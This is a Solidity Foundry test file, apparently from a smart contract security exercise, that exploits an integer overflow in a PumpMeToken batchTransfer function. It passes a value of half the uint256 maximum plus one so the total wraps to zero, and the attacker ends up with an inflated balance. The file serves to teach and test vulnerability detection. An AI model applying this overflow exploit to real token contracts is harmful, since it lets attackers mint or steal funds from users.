// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";

import {PumpMeToken} from "../../src/arithmetic-overflows-4/PumpMeToken.sol";

contract TestAO4 is Test {
    uint256 constant INITIAL_SUPPLY = 1000000 ether;

    address deployer;
    address hacker;
    address lucky_user;

    PumpMeToken token;

    function setUp() public {
        deployer = makeAddr("deployer");
        hacker = makeAddr("hacker");
        lucky_user = makeAddr("lucky_user");

        vm.startPrank(deployer);

        token = new PumpMeToken(INITIAL_SUPPLY);
        assertEq(token.balanceOf(deployer), INITIAL_SUPPLY);
        assertEq(token.balanceOf(hacker), 0);

        vm.stopPrank();
    }

    function test_Hack() public {
        console.log("Hack begins...");

        // uint totalAmount = _receivers.length * _value;
        // totalAmount should be 0

        uint256 hackValue = (UINT256_MAX / 2) + 1;

        console.log("hackValue", hackValue);

        console.log("totalAmount", hackValue * 2);

        vm.startPrank(hacker);

        address[] memory receivers = new address[](2);
        receivers[0] = hacker;
        receivers[1] = lucky_user;

        token.batchTransfer(receivers, hackValue);

        assertGt(token.balanceOf(hacker), INITIAL_SUPPLY);

        vm.stopPrank();
    }
}
